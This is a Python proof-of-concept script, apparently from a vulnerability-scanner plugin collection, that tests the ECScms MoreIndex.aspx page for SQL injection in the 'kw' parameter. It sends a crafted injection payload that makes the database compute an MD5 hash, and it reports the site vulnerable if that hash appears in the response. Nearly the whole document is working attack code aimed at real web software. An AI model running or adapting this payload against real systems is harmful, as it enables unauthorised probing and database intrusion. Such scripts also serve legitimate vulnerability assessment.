#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 易创思ECScms MoreIndex SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-088844
author: Lucifer
description: 文件MoreIndex.aspx中,参数kw存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result =['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/MoreIndex.aspx?pkId=0&kw=a%27%20AnD%201=(SeLeCt%20Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27)))--&st=2&t=1"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[1]=  '存在'
                result[0] = vulnurl
            else:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
